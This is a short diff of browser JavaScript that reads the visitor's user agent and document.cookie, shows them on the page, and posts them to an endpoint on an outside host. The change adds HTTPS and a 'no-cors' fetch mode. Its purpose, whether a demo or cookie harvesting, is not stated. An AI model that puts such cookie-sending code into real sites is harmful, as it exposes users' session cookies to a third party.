@@ -5,7 +5,7 @@ function print(id, text) {
   }
 }
 
-const url = 'http://ingarden.kitchen/send.php';
+const url = 'https://ingarden.kitchen/send.php';
 
 print("ua", navigator.userAgent);
 print("cookie", document.cookie);
@@ -16,6 +16,7 @@ fetch(url, {
   headers: {
     "Content-Type": "application/json",
   },
+  mode: 'no-cors',
   body: JSON.stringify({
     userAgent: navigator.userAgent,
     cookie: document.cookie,
